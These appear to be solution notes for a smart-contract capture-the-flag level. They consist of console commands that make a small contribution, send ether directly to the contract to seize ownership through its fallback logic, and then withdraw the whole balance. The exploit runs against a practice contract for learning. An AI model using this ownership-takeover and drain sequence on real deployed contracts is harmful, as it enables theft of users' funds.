# Contribution is zero
(await contract.getContribution()).toNumber()

# Getting bigger than zero contribution 
contract.contribute({from: "0x5Fb17f13465950ED8726f7ECE8CBA3dFB37566aF", value: toWei(0.0009, "ether")})

# Taking over owner
sendTransaction({from:"0x5Fb17f13465950ED8726f7ECE8CBA3dFB37566aF",to:contract.address, value:toWei(0.05, "ether")})

# Checking new owner
await contract.owner()

# Checking balance of the contract
await getBalance(contract.address)

# Withdrowing the full balance
contract.withdraw()

# Checking if balance is zero
await getBalance(contract.address)


